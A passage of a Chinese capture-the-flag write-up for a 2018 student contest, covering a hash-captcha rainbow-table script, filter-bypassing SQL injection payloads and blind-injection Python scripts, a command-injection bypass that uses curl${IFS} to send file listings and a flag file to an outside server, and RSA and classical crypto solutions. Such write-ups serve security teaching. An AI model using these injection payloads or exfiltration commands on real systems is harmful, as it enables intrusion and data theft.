class="line">输出格式</span><br><span class="line">该验证码的破解结果</span><br><span class="line">如</span><br><span class="line">    3f2d81a</span><br><span class="line">表示字符串&quot;3f2d81a&quot;经过MD5运算后的0到5位为&quot;dc55b0&quot;</span><br><span class="line">更多例子</span><br><span class="line">输入</span><br><span class="line">    MD5</span><br><span class="line">    9d73</span><br><span class="line">    10 13</span><br><span class="line">表示我们需要寻找一个字符串，使得该字符串经过MD5运算后的10到13位为&quot;9d73&quot;</span><br><span class="line">输出</span><br><span class="line">    a05b9c</span><br><span class="line">表示字符串&quot;a05b9c&quot;经过MD5运算后的10到13位为&quot;9d73&quot;</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">    SHA256</span><br><span class="line">    08a31f</span><br><span class="line">    1 6</span><br><span class="line">表示我们需要寻找一个字符串，使得该字符串经过SHA256运算后的1到6位为&quot;08a31f&quot;</span><br><span class="line">输出</span><br><span class="line">    c26bdc</span><br><span class="line">表示字符串&quot;c26bdc&quot;经过SHA256运算后的1到6位为&quot;08a31f&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 此类的哈希验证码在CTF竞赛中十分常见，需要碰撞一个最大长度为6的哈希，如果直接使用暴力破解的话效率十分低下，能多久跑出来就看命，但是如果使用彩虹表的话就完全不一样了。<br>这里只以最长的6位验证码为例，6位以下的更简单。<br> 首先分析一下，长度为6的哈希值，其范围为从000000~ffffff，也就是说一共有16^6=16777216种哈希值，这个数只到千万级别，不是很大。那么在理想情况（所有字符串产生的哈希值前六位均不同），我们只需要字符集0~f组成的6位16777216个不同的字符串，就一定可以得到所有的6位哈希值，但是现实中并没有这样的理想情况，这16777216个不同的字符串中有很大概率会有些字符串的哈希值前6位是相同的，为了降低这个概率，我们就需要更多的字符串。<br> 如果我们同样使用0~f的字符集，组成7位字符串，就会产生16^7=268435456种不同的哈希，这个数是6位字符串的16倍，已经到了亿级别了，可以有非常大的概率保证覆盖了000000~ffffff所有的哈希可能值，但是16^7又有点太大了，其中有很多冗余数据我们在查验证码的时候用不到，所以需要对范围进行调整，从0000000~3ffffff将会用到480M的内存，从0000000~4fffff会用掉700M的内存，当然范围越大准确率也越高，但是占的内存也越多。<br> 另外为了查询彩虹表方便，需要对彩虹表进行一定规律的排序，根据哈希值进行排序就能很快的移动文件指针找到对应行。<br>脚本如下(以MD5为例)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Generate</span>(<span class="params">ran1, ran2, filename</span>):</span></span><br><span class="line">    cache_dict = &#123;&#125;</span><br><span class="line">    length = ran2 - ran1</span><br><span class="line">    a = <span class="string">&#x27;%0&#x27;</span> + str(length + <span class="number">1</span>) + <span class="string">&#x27;x&#x27;</span></span><br><span class="line">    b = <span class="string">&#x27;%0&#x27;</span> + str(length) + <span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[*]Generating cache...&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">7</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fffffff</span></span><br><span class="line">        ranges2 = <span class="number">0x10000000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">6</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ffffff</span></span><br><span class="line">        ranges2 = <span class="number">0x1000000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">5</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fffff</span></span><br><span class="line">        ranges2 = <span class="number">0x100000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">4</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ffff</span></span><br><span class="line">        ranges2 = <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">3</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fff</span></span><br><span class="line">        ranges2 = <span class="number">0x1000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">2</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ff</span></span><br><span class="line">        ranges2 = <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(ranges1):</span><br><span class="line">    <span class="comment"># for i in xrange(0xfffff):</span></span><br><span class="line">    <span class="comment"># for i in xrange(0x4fffff): # 700MB + RAM</span></span><br><span class="line">    <span class="comment"># for i in xrange(0x3fffff): # 480MB + RAM</span></span><br><span class="line">        s = a % i</span><br><span class="line">        sub_hash = md5(s).hexdigest()[ran1:ran2]</span><br><span class="line">        cache_dict[sub_hash] = s</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[*]Done.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[*]Writing to disk...&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        miss = <span class="string">&#x27;*&#x27;</span> * (length + <span class="number">1</span>)</span><br><span class="line">        miss = <span class="string">&#x27;%s &#x27;</span> + miss + <span class="string">&#x27;n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(ranges2):</span><br><span class="line">            k = b % i</span><br><span class="line">            <span class="keyword">if</span> cache_dict.has_key(k):</span><br><span class="line">                f.write(<span class="string">&#x27;%s %sn&#x27;</span> % (k, cache_dict[k]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.write(miss % k)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[*]Done.&#x27;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;[*]Saved as &#x27;</span>%s<span class="string">&#x27; at current directory.&#x27;</span> % filename</span><br><span class="line">    <span class="keyword">del</span> cache_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Proof</span>(<span class="params">proof, filename</span>):</span></span><br><span class="line">    length = len(proof)</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        offset = int(proof, <span class="number">16</span>) * (length + <span class="number">1</span> + length + <span class="number">1</span> + <span class="number">1</span>)</span><br><span class="line">        f.seek(offset)</span><br><span class="line">        result = f.read(length + <span class="number">1</span> + length + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> result.split()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">generate(<span class="number">0</span>, <span class="number">6</span>, <span class="string">&#x27;dic.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> proof(<span class="string">&#x27;dc55b0&#x27;</span>, <span class="string">&#x27;dic.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="cookie-150"><a href="#cookie-150" class="headerlink" title="cookie (150)"></a>cookie (150)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你知道什么是cookie吗？</span><br><span class="line"></span><br><span class="line">(cookie本身并不是flag)</span><br><span class="line">http:&#x2F;&#x2F;*********:8080&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将cookie中give_me_the_flag的值改为1刷新即可<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911204309.png"></p><blockquote><p>flag{U_jus7_3dit_The_cookie}</p></blockquote><hr><h2 id="BabySQLi-200"><a href="#BabySQLi-200" class="headerlink" title="BabySQLi (200)"></a>BabySQLi (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Baby SQL injection.</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*******:25252&#x2F;</span><br><span class="line"></span><br><span class="line">注：此题仅限大一学生，大二及以上学生不计分</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个题没什么难的，Hint也给了语句，什么也没过滤，告诉了flag在fl4g表里，直接注入就行，另外注意sqlite中没有井号（#）注释符</p><p>payload：’ union select * from fl4g –<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205408.png"></p><blockquote><p>flag{B4BY_5q1_1nJec7i0n}</p></blockquote><hr><h2 id="BabyBurp-200"><a href="#BabyBurp-200" class="headerlink" title="BabyBurp (200)"></a>BabyBurp (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Change another way to visit a website?</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*********&#x2F;BabyBurp.php</span><br><span class="line"></span><br><span class="line">hint: You should download a tool ----&gt;&quot;burp suite&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下载<a href="https://portswigger.net/burp">BurpSuit</a><br>开启代理拦截，题目里说“You may use your iphoneXXXXXX to find the flag?”，所以更改user agent为“iphoneXXXXXX”的即可。<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205049.png"></p><blockquote><p>flag{Bu1p_1s_tH3_beSt}</p></blockquote><hr><h2 id="EasySQLi-220"><a href="#EasySQLi-220" class="headerlink" title="EasySQLi (220)"></a>EasySQLi (220)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Very easy SQl injection.</span><br><span class="line">What did I filter?</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*******:25254&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继续用上一题的payload发现union、select和from被过滤掉了，用双写或大小写都能绕过<br>payload1：’ uNion selEct * frOm fl4g –<br>payload2：’ ununionion selselectect * frfromom fl4g –<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205615.png"></p><blockquote><p>flag{50_ea5y_r1gh7}</p></blockquote><hr><h2 id="HardSQLi-250"><a href="#HardSQLi-250" class="headerlink" title="HardSQLi (250)"></a>HardSQLi (250)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A little difficult SQL injection</span><br><span class="line">Really looks like the previous challenge?</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*******:25255&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着用第一题的payload测试，发现出了union、select和from被过滤外，空格也被过滤掉了，可以利用注释符/**/绕过，另外大小写不能绕过关键字的过滤，只有双写能绕过<br>payload：’/**/uniunionon/**/seselectlect/**/*/**/frfromom/**/fl4g/**/–/**/<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205945.png"></p><blockquote><p>flag{4_b1t_0f_HaRd_hhhhhh}</p></blockquote><hr><h2 id="BadSQLi-300"><a href="#BadSQLi-300" class="headerlink" title="BadSQLi (300)"></a>BadSQLi (300)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I heard only the real bad-ass can solve this challenge.</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;srpopty.cn:25253&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个题除了前面那些过滤外，还过滤掉了所有空白字符，星号（*）以及逗号，只能盲注，空白字符可以用括号绕过<br>payload1（获取列名）：1’oorr(selorect(hex(sql))frorom(sqlite_master))like(‘%s%%’)–<br>payload2（获取flag）：1’oorr(selorect(hex(text))frorom(fl4g))like(‘%s%%’)–</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.hexdigits</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.86.208:25253/?id=&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;1&#x27;oorr(selorect(hex(sql))frorom(sqlite_master))like(&#x27;%s%%&#x27;)--&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;1&#x27;oorr(selorect(hex(text))frorom(fl4g))like(&#x27;%s%%&#x27;)--&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; len(dic):</span><br><span class="line">    payload = payload1 % (result + dic[i])</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    ret = requests.get(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;When&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        result += dic[i]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;[+] &#x27;</span> + result</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[*] Result: &#x27;</span> + result.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{ThI5_5q1i_s0_B4444d}</p></blockquote><hr><h2 id="RealSQL"><a href="#RealSQL" class="headerlink" title="RealSQL"></a>RealSQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag is admin&#39;s password.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;********:23333&#x2F;</span><br></pre></td></tr></table></figure><p>这是一道真正的SQL注入题，不像前面的题目甚至给出了查询语句的样子，这个题什么也没有给，所以需要自己试一试哪些被过滤掉了，被过滤掉的字符都会弹出<br>“illegal character!!@_@”的提示，以此来判断哪些字符被过滤掉了。</p><p>大部分在登录或注册等界面的SQL注入，注入点基本都在username处，大部分网站在后端会把password进行哈希，与数据库中保存的进行比较，所以password不大可能有注入。</p><p>这里直接给出过滤的正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="string">&quot;/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;</span>.urldecode(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.urldecode(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match($filter,$str))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strrpos($str,urldecode(<span class="string">&quot;%00&quot;</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到被过滤的有空格、空白字符、*、#、union、like、regexp、for、and、or、–、&amp;、|等常见的注入字符<br>但是还有一些SQL语句操作符没有被过滤掉</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!,!=,=,+,-,^,%,&gt;,&lt;,~</span><br></pre></td></tr></table></figure><p>首先测试uname，如果uname随便输入一个用户的话，会弹出“username error!!@_@”的提示，所以可以肯定有一次对uname的查询，以此首先来判断uname是否存在，那么猜测查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> uname=<span class="string">&#x27;&#123;$input&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中$input为我们的输入，虽然过滤掉了所有的空白字符，但是有很多布尔以及算数运算符没有被过滤，那么就可以构造连续的布尔式获取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from users where username&#x3D;&#39;&#39;!&#x3D;(mid((username)from(-1))&#x3D;&#39;a&#39;)</span><br></pre></td></tr></table></figure><p>如果(mid((username)from(-1))=’a’)返回了0，那么中间的表达式就会为false，整个表达式也会为false，如果返回了1，就代表查到了数据，因此可以提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;!&#x3D;(mid((passwd)from(-1))&#x3D;&#39;e&#39;)&#x3D;&#39;1&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>这样一位一位的猜出来password<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-  coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://********:23333/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">randstr = string.ascii_letters + string.digits + <span class="string">&#x27;&#125;_&#123;&#x27;</span></span><br><span class="line">remark = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> randstr:</span><br><span class="line">        passwd = i+remark</span><br><span class="line">        uname = <span class="string">&quot;&#x27;!=(mid((passwd)from(-&#123;j&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span>.format(</span><br><span class="line">            j=str(j), passwd=passwd)</span><br><span class="line">        data = &#123;<span class="string">&quot;uname&quot;</span>: uname, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;ddd&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">print</span> uname</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;password error!!&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            remark = passwd</span><br><span class="line">            <span class="keyword">print</span> remark</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{THI5_1s_Real_sq1}</p></blockquote><hr><h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please do this challenge after you can login with admin.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;********:23333&#x2F;</span><br></pre></td></tr></table></figure><p>这个题需要上个题登录到admin以后才能做，用上一题的flag登录成功后可以看到一个命令执行的界面，题目的目的非常简单，执行命令，但是看不到命令执行的结果，只能知道命令是否执行完成，另外此题对命令也做了一些过滤，但是并不是很难。</p><p>最简单的思路就是用反弹shell获取数据，但是对反弹shell也做了一些限制，过滤正则如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter &#x3D; &quot; |bash|perl|nc|java|php|&gt;|&gt;&gt;|wget|ftp|python|sh&quot;;</span><br></pre></td></tr></table></figure><p>空格可以使用${IFS}绕过，获取数据可以用curl<br>首先在自己的服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345 -vv</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl<span class="variable">$&#123;IFS&#125;</span>***.***.***.***:12345/`ls<span class="variable">$&#123;IFS&#125;</span>-al|base64`</span><br></pre></td></tr></table></figure><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924155642.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl<span class="variable">$&#123;IFS&#125;</span>123.206.86.208:12345/`cat<span class="variable">$&#123;IFS&#125;</span>flag_788f1a3aa1fa053f7fa6560d456f4b92|base64`</span><br></pre></td></tr></table></figure><blockquote><p>flag{sql_iNJEct_comMond_eXEC!}</p></blockquote><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="BabyCrypto-100"><a href="#BabyCrypto-100" class="headerlink" title="BabyCrypto (100)"></a>BabyCrypto (100)</h2><pre><code>Who is Caesar?Notice: This question is limited to the freshman , sophomore and above will not scoredqwlr&#123;G3cj_P4dj_NLp5lC_n1as3c&#125;</code></pre><p>flag被凯撒加密了，qwlr{G3cj_P4dj_NLp5lC_n1as3c}就是密文，解密即可</p><blockquote><p>flag{V3ry_E4sy_CAe5aR_c1ph3r}</p></blockquote><hr><h2 id="BabyCrypto2-100"><a href="#BabyCrypto2-100" class="headerlink" title="BabyCrypto2 (100)"></a>BabyCrypto2 (100)</h2><pre><code>This is a simple Morse Code!Notice: This question is limited to the freshman , sophomore and above will not scoredHint: All characters of flag are uppercase.flag&#123;-... .- -... -.-- -- --- .-. ... . -.-. --- -.. .&#125;</code></pre><p>这次是被用摩斯电码加密了，也是直接解密即可，注意flag中所有的字符都是大写（莫斯电码不区分大小写）</p><blockquote><p>flag{BABYMORSECODE}</p></blockquote><hr><h2 id="RSA-150"><a href="#RSA-150" class="headerlink" title="RSA (150)"></a>RSA (150)</h2><pre><code>RSA is based on a simple formula, let&#39;s do a math problem.c = 150815d = 1941N = 435979what is the decrypted number?Hint: flag&#39;s format is flag&#123;decrypted number&#125;</code></pre><p>这个题只是考察了RSA的解密公式<br><code>decrypted = c ^ d mod N</code></p><p>另外在RSA体系中，m、c、d、e、n这些的含义大都是固定的，随便找几篇文章就能懂。<br>最后结果为133337</p><blockquote><p>flag{133337}</p></blockquote><hr><h2 id="RSA2-250"><a href="#RSA2-250" class="headerlink" title="RSA2 (250)"></a>RSA2 (250)</h2><pre><code>This puzzle are different from the previous puzzle, what&#39;s the &quot;dq&quot; and &quot;dp&quot;? Can you decrypt the ciphertext?c: 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885p: 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243q: 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629dp: 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961dq: 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659</code></pre><p>和上一道题相比没有了d以及n，多了dp和dq，题目描述中也问了什么是dp以及dq，它们与中国剩余定理算法相关<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911211512.png"></p><ul><li>p和q是素数</li><li>dp = d mod (p - 1)</li><li>dq = d mod (q - 1)</li><li>qInv = (1/q) mod p （1/q为q的乘法逆元）</li><li>m1 = c^dp mod p</li><li>m2 = c^dq mod q</li><li>h = qInv * (m1 - m2) mod p</li><li>m = m2 + h * q</li></ul><p>现在直接按照上述步骤计算即可，p、q、dp、dq与c均已知，最后就能直接算出明文m，另外上述步骤中的qInv是模逆的</p><p>具体请参考：<a href="https://www.di-mgt.com.au/crt_rsa.html">应用于RSA的中国剩余定理</a></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span 